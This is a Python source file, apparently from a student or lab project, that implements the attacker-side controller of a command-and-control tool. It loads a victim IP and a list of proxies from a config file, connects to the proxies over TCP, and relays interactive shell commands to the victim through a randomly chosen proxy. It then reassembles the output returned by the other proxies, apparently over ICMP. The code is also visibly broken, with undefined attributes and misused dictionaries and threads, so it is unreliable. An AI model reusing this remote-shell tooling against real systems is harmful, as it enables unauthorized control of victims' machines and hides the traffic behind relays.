#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import datetime 
import time
import ipaddress
import sys 
import os 
import argparse 
import re 
import random
import threading
from functools import partial 
import json 
import socket 

from mymethods import * 

from scapy.all import * 

#file_path = "./attacksingleton.py"
#directory = os.path.dirname(file_path)
#sys.path.insert(0, directory)
#import attacksingleton 
from attacksingleton import * 


#-----------------------------------------
def separa_dati_byID(received_data:dict[str,list]):
    dati_separati:dict[str,list]=[]
    unindent_data=[]
    ## dati_separati={id:lista}
    for list_data in received_data.values(): 
        if isinstance(list_data, bytes):
                list_data=list_data.decode()
        else: print(type(data))
        for data in list_data.split("||"): 
            unindent_data.append([x for x in data])
    #print("unindent_data: ",unindent_data)    
    for list_data in unindent_data:
        #print("list_data: ",list_data)
        #print(f"\t***{list_data}")
        if isinstance(list_data, bytes):
                list_data=list_data.decode()
        else: print(type(data))
        list_data=list_data.split("&&")
        if len(list_data)!=2:
            print(f"Errore. Length is {len(list_data)}\t{list_data}")
            continue
        if dati_separati.get(list_data[0]) is None:
            dati_separati.update({list_data[0]:[]}) 
        dati_separati.get(list_data[0]).append(list_data[1]) 
    return dati_separati

def old_separa_dati_byID(received_data:dict[str,list], dati_separati:dict[str,list]):
    unindent_data=[]
    ## dati_separati={id:lista}
    for list_data in received_data.values():
        for data in list_data:
            if isinstance(data, bytes):
                data=data.decode()
            if isinstance(data, str):
                data=data.split("||")
            else: print(type(data))
            #print("Separa: ",data) 
            unindent_data.append([x for x in data])
    #print("unindent_data: ",unindent_data)    
    for list_data in unindent_data:
        #print("list_data: ",list_data)
        #print(f"\t***{list_data}")
        for index in range(len(list_data)):
            #print(f"AAAA: {index}/{len(list_data)}")
            if not list_data[index]: 
                continue
            #print(f"\t***{list_data[index]}") 
            if isinstance(list_data[index],bytes):
                data=list_data[index].decode()
            if isinstance(list_data[index],str): 
                data=list_data[index].split("\t")
            #print("***DATA: ",data) 
            if dati_separati.get(data[1]) is None:
                dati_separati.update({data[1]:[]}) 
            dati_separati.get(data[1]).append(data)   

def unisciDati(dati_separati:dict[str:list]):
    payload=[] 
    for index in range(len(dati_separati)): 
        #print("DATI: ",dati_separati.get(str(index))) 
        for data in dati_separati.get(str(index)):
            if data[2]==MSG.LAST_PACKET:
                continue
            payload.append(data[2])
    return payload

#----------------------------------------- 


def restart_thread(thread_list:dict[str:threading.Thread]): 
    for thread in thread_list.values():
        thread.start()




#-----------------------------------------

class CONNECTED_PROXY: 
    proxy_list=None
    Proxy_Socket:dict[str,socket.socket]={} 
    Proxy_Thread:dict[str,threading.Thread]={} 
    Proxy_ThreadingEvent:dict[str,threading.Event]={} #event_proxy_update
    #1-__init__
    #2-send_message
    #3-start_thread
    def __init__(self,proxy_list:list[ipaddress._IPAddressBase],callback_function):
        if not IS_TYPE.list(proxy_list) or len(proxy_list)<=0: 
            raise TypeError("proxy_list non valida") 
        if not IS_TYPE.callable_function(callback_function): 
            raise TypeError("callback_function not callable") 
        self.proxy_list=proxy_list.copy()
        for proxy in proxy_list: 
            #with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socket_4_proxy: 
            if not IS_TYPE.ipaddress(proxy):  
                self.proxy_list.pop(self.proxy_list.index(proxy))  
                continue 
            try: 
                socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket_proxy.connect((proxy.compressed, proxy_port)) 
                #socket_proxy.connect(("192.168.56.104", 4567))
                #print("SOCKET",socket_proxy) 
                self.Proxy_Socket.update({proxy.compressed:socket_proxy}) 
                thread=threading.Thread( 
                    #La callback aspetta l'aggiornamneto dal proxy (wait_proxy_update)
                    target=callback_function 
                    ,args=[proxy]
                ) 
                self.Proxy_Thread.update({proxy.compressed:thread}) 
                self.Proxy_ThreadingEvent.update({proxy.compressed:GET.threading_Event()}) 
            except Exception as e:
                print(f"CONNECTED_PROXY: {e}") 
                self.proxy_list.pop(self.proxy_list.index(proxy)) 
                socket_proxy.close()  
        print(f"Got all connected proxy") 
        self.reset_Proxy_ThreadingEvent() 
        print("Per ogni proxy creato il proprio evento di aggiornamento 'proxy_update'") 

    def send_message(self, ip_vittima:ipaddress._IPAddressBase,attack_function:Enum): 
        if not IS_TYPE.ipaddress(ip_vittima): 
            raise TypeError("ip_vittima non vlaido") 
        
        for proxy,socket in self.Proxy_Socket: 
            data=(
                MSG.CONFIRM_ATTACKER+ip_vittima.compressed+"||"+
                MSG.ATTACK_FUNCTION+next(iter(attack_function.items()))[0]
            )
            socket.sendall(data.encode()) 
            data=socket.recv(1024).decode()
            print(f"Socket {proxy} Received: {data}") 
            if not data or data!=(MSG.CONFIRM_PROXY+ip_vittima.compressed+proxy.compressed):
                print(f"Close connection for {proxy}")  
                socket.sendall(MSG.END_COMMUNICATION.encode())
                socket.close()
                self.proxy_list.pop(self.proxy_list.index(proxy)) 
                continue 

    def start_thread(self): 
        self.reset_thread()
        for _,thread in self.Proxy_Thread:
            thread.start() 
    
    def wait_thread(self):
        for thread in self.Proxy_Thread.values():
            thread.join() 
        print("Thread all done") 
    
    def reset_thread(self): #reset_event_update_foreach_proxy 
        #reset_event_update_foreach_proxy(self.proxy_list, self.Proxy_ThreadingEvent) 
        if not IS_TYPE.list(self.proxy_list) or len(self.proxy_list)<=0 or any(not IS_TYPE.ipaddress(ip) for ip in self.proxy_list): 
            raise TypeError("proxy_list non valido") 
        if not IS_TYPE.dictionary(self.Proxy_ThreadingEvent) or len(self.Proxy_ThreadingEvent)<=0: 
            raise TypeError("Proxy_ThreadingEvent non valido")  
        for _,thread in self.Proxy_Thread:
            thread.clear() 
    
#-----------------------------------------  
def load_config_file(default_file_path, path_of_file): 
    if not os.path.exists(path_of_file) or not str(path_of_file).endswith(".json"):
        if os.path.exists(default_file_path):
            print(f"File {path_of_file}  non trovato, si usa quello di default")
            path_of_file=default_file_path
        else: raise FileNotFoundError(f"I file {path_of_file} e {default_file_path} non sono presenti")
    with open(path_of_file, 'r') as file: 
        print(f"File di configurazione {path_of_file} caricato correttamente") 
        return json.load(file) 

class GET_ARGS:  
    def from_parser(oggetto=None): 
        if isinstance(oggetto,Attacker): 
            print("_attacker_get_args_from_parser") 
            parser = argparse.ArgumentParser()
            parser.add_argument("--file_path",type=str, help="File di configurazione")  
            try:
                args,unknown =PARSER.check_arguments(parser) 
                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
                    raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                return args if GET_ARGS.check_value_in_parser(oggetto, args) else None
            except Exception as e:
                print(e)
                PARSER.print_supported_arguments(parser) 
        #elif isinstance(oggetto,Proxy): 
        #    print("Proxy") 
        #elif isinstance(oggetto,Victim): 
        #    print("Proxy") 
        return None
    
    def check_value_in_parser(oggetto, args): 
        if not isinstance(args,argparse.Namespace): 
            print(f"args non valido") 
        if isinstance(oggetto,Attacker):  
            if not args.file_path or not IS_TYPE.string(args.file_path): 
                print(f"--file_path non specificato") 
            else: return True 
        #elif isinstance(oggetto,Proxy):  
        #    if not args.file_path or not IS_TYPE.string(args.file_path): 
        #        print(f"--file_path non specificato") 
        #    else: return True 
        #elif isinstance(oggetto,Victim):  
        #    if not args.file_path or not IS_TYPE.string(args.file_path): 
        #        print(f"--file_path non specificato") 
        #    else: return True
        return False

class MSG_CONFIG(Enum): 
    attack_method="attack_function" 
    proxy_list="proxy_list"

class ICMP_THREAD: 
    thread_lock=None 
    thread_response={} 
    thread_list={} 

    def __init__(self, proxy_list:list[ipaddress._IPAddressBase], callback_function):  
        if not IS_TYPE.list(proxy_list) or len(proxy_list)<=0: 
            raise TypeError("proxy_list non vlaida") 
        if any(not IS_TYPE.ipaddress(ip) for ip in proxy_list): 
            raise ValueError("proxy_list non vlaida") 
        if not IS_TYPE.callable_function(callback_function): 
            raise TypeError("callback_function not callable")
        self.thread_lock=GET.threading_Lock() 
        for proxy in proxy_list: 
            if not IS_TYPE.ipaddress(proxy): 
                print(f"***\t{proxy} non è un indirizzo valido")
                continue 
            thread=threading.Thread(
                target=callback_function, 
                args=[proxy]
            ) 
            thread.name=f"Thread-{proxy.compressed}" 
            self.thread_list.update({proxy.compressed:thread}) 
            self.thread_response.update({proxy.compressed:False}) 
        print("Definiti il dizionario dei thread") 
    
    def reset_Thread(self): 
        print("Reimposto i thread che ricevono i dati") 
        for thread in self.thread_list.values():
            thread.clear()  

    def start_Thread(self): 
        self.reset_Thread()
        print("Attivo i thread per ricevere i dati") 
        for thread in self.thread_list.values():
            thread.start() 
    
    def wait_Thread(self): 
        print("Asptto che i thread terminino") 
        for thread in self.thread_list.values():
            #thread.wait()  
            thread.join()  

#-----------------------------------------  
default_file_path:str = "./attack_file.json" 
proxy_port=4567
class Attacker: 
    dati_separati={} 
    connected_proxy:CONNECTED_PROXY=None 
    received_data:dict[str,list]={} 

    attack_type:AttackType=None
    ip_vittima:ipaddress._IPAddressBase=None
    ip_host:ipaddress._IPAddressBase=None
    
    def __init__(self):  
        args=GET_ARGS.from_parser(self)  
        if not IS_TYPE.namespace(args): 
            exit(-1) 
        config_file=load_config_file(
            default_file_path, args.file_path
        ) 
        self.set_variables(config_file) 
    
    def set_variables(self,config_file): 
        def get_attacco(): 
            attack_type=AttackType.get_attack_method(config_file.get("attack_function"))
            if not IS_TYPE.enum(attack_type,AttackType): 
                #raise TypeError("attack_type non valido") 
                attack_type=AttackType.choose_attack_function()  
            if not IS_TYPE.enum(attack_type, AttackType): 
                raise TypeError("attack_type non valido") 
            print("Attacco selezionato:", attack_type) 
            return attack_type
        def get_vittima(): 
            ip_vittima=ipaddress.ip_address(config_file.get("ip_vittima", None)) 
            print(f"IP vittima: {type(ip_vittima) } {ip_vittima }")
            return ip_vittima
        def get_ip_host(): 
            ip_host, errore=NETWORK.IP.find_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                try: 
                    ip_host=ipaddress.ip_address(input(msg)) 
                except Exception as e: 
                    print(e) 
                    return None
            try: 
                #TODO eliminare alla fine
                #self.ip_host=ipaddress.ip_address("192.168.56.104") 
                ip_host=ipaddress.ip_address(ip_host) 
            except Exception as e: 
                print(e) 
                return None
            print(f"ip_host: {type(ip_host)} {ip_host}") 
            return ip_host
        def get_proxy_list():  
            proxy_list:list[ipaddress._IPAddressBase]=[]
            for ip_proxy in config_file.get("proxy_list", []): 
                try:
                    proxy_ip=ipaddress.ip_address(ip_proxy)
                    proxy_list.append(proxy_ip)  
                except ValueError as e:
                    print(f"get_proxy_list: {e}") 
            print(f"Lista proxy sanificata") 
            return proxy_list 
        #----------------------
        self.attack_type=get_attacco() 
        self.ip_vittima=get_vittima() 
        self.ip_host=None
        while not IS_TYPE.ipaddress(self.ip_host): 
            self.ip_host=get_ip_host() 
        proxy_list=get_proxy_list()
        print("CONNESSIONE CON I PROXY")
        self.connected_proxy=CONNECTED_PROXY(proxy_list, self.wait_proxy_update) 
        if len(self.connected_proxy.proxy_list)<=0: 
            print("NESUSN PROXY DISPONIBILE")
            exit(0) 
        for proxy in proxy_list: 
            self.received_data.update({proxy.compressed:[]}) 
        self.connected_proxy.send_message( self.ip_vittima,self.attack_type)
        self.connected_proxy.start_thread() 
        self.connected_proxy.wait_thread() 
        #thread_list=connected_proxy.Proxy_Thread
        #dict_proxy_socket=connected_proxy.Proxy_Socket  
    
    def send_command_to_victim(self): 
        self.data_lock=GET.threading_Lock()
        self.connected_proxy.set_Proxy_ThreadingEvent()
        #event_thread_update -> self.connected_proxy.Proxy_ThreadingEvent 
        self.icmp_thread=ICMP_THREAD(self.connected_proxy.proxy_list, self.wait_proxy_update) #thread_lock, thread_proxy_response, thread_list
        self.event_received_data=GET.threading_Event() 
        self.icmp_thread.start_Thread() 
        msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
        command=input(msg) 
        while command.lower() not in exit_cases: 
            print(f"Il comando immesso è: {command}")
            try:
                chosen_proxy=random.choice(self.proxy_list)
                #print(f"Il proxy scelto è: {chosen_proxy}")
            except Exception as e:
                print(f"send_command_to_victim: {e}") 
                continue
            print(f"Il comando {command} verrà mandato al proxy {chosen_proxy}") 
            socket= self.connected_proxy.Proxy_Socket.get(chosen_proxy.compressed)
            data=(MSG.CONFIRM_COMMAND+command)
            socket.sendall(data.encode())
            print(f"Gli altri proxy ascolteranno direttamente la vititma")
            for proxy in self.connected_proxy.proxy_list:
                if proxy!=chosen_proxy :
                    socket= self.connected_proxy.Proxy_Socket.get(proxy.compressed)
                    socket.sendall(MSG.WAIT_DATA.encode()) 
            self.icmp_thread.wait_Thread() 
            print("Separazione dati per SEQ") 
            try:
                print("ABCDEFG: ",self.received_data)
                self.dati_separati= separa_dati_byID(self.received_data) 
                print("ABCDEFG: ",self.dati_separati)
            except Exception as e:
                print(f"send_command_to_victim separa: {e}")
            #print("\n***dati_separati: ", self.dati_separati) 
            print("Dati separati per Sequenza")   
            try:
                payload=unisciDati(self.dati_separati)
                print(payload)
            except Exception as e:
                print("aiuto eccezzione: ",e) 
            
            #reset thread and reset received_data
            self.reset_variables()
            command=input(msg) 
        print("Uscita dalla shell\texit")  
        for proxy in self.proxy_list:
            socket_proxy=self.dict_proxy_socket.get(proxy.compressed)
            socket_proxy.sendall(MSG.END_COMMUNICATION.encode()) 
            socket_proxy.close()


    def wait_proxy_update(self, proxy:ipaddress._IPAddressBase):  
        if not IS_TYPE.ipaddress(proxy): 
            raise TypeError("proxy non valido") 
        #
        proxy_socket=self.dict_proxy_socket.get(proxy.compressed)
        confirm_text=MSG.CONFIRM_VICTIM + self.ip_vittima.compressed+proxy.compressed  
        data_received=proxy_socket.recv(1024).decode()
        if confirm_text not in data_received: 
            self.dict_proxy_socket.pop(proxy.compressed)
            proxy_socket.close()  
            self.proxy_list.pop(self.proxy_list.index(proxy)) 
            raise Exception(f"{proxy.compressed}: dati ricevuti invalidi {data_received}")
        result=data_received.replace(confirm_text,"")
        print(f"{proxy} è connesso alla vittima? {type(result)} {result}")
        if result!="True":
            print(f"Proxy {proxy} non connesso alla vittima")
            self.dict_proxy_socket.pop(proxy.compressed)
            proxy_socket.close()  
            self.proxy_list.pop(self.proxy_list.index(proxy)) 
            return False 
        print(f"Proxy {proxy} connesso alla vittima")
        return True 
    
    def wait_data_from_proxy(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address):  
        print("wait_data_from_proxy")
        self.data_lock.acquire()
        proxy_data=self.received_data.get(proxy.compressed)
        self.data_lock.release()

        proxy_socket=self.dict_proxy_socket.get(proxy.compressed)
        #print("UUU: ",proxy_socket)
        while(data:=proxy_socket.recv(1024)): 
            #print(f"AAA:{proxy.compressed}: {data}",file=sys.stdout,flush=True)
            #print("proxy_data: ",proxy_data)
            self.data_lock.acquire() 
            proxy_data.append(data) 
            self.data_lock.release()
            print(f"Received from proxy: {proxy_data}")
            if MSG.LAST_PACKET.encode() in data:
                break
        print("Received all data") 
        return 
    
    def reset_variables(self):
        reset_event_update_foreach_proxy(self.proxy_list, self.event_thread_update) 
        self.thread_list={}
        self.dati_separati={}
        self.received_data:dict[str,list]={}
        for proxy in self.proxy_list: 
            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                print(f"***\t{proxy} non è un indirizzo valido")
                continue
            self.received_data.update({proxy.compressed:[]}) 
            thread=threading.Thread(
                target=self.wait_data_from_proxy 
                ,args=[proxy]
            )
            thread.name=f"Thread-{proxy.compressed}"
            self.thread_list.update({proxy.compressed:thread})
        for proxy in self.proxy_list:
            self.event_thread_update.get(proxy.compressed).clear() 
        restart_thread(self.thread_list) 

        #mythread.setup_thread_foreach_address(self.proxy_list, self.wait_data_from_proxy)
        
        #thread=threading.Thread(
        #    target= callback_function #wait_proxy_update
        #    ,args=[proxy]
        #) 
        #thread_list.update({proxy.compressed:thread})
        #thread.start() 
        
        #if want_to_choose_new_attack():
        #    self.attack_function=choose_new_attack() 
        #if want_to_choose_new_victim:
        #   self.ip_vittima= choose_new_victim() 
    
    

if __name__=="__main__": 
    attacker=Attacker() 
    attacker.send_command_to_victim()
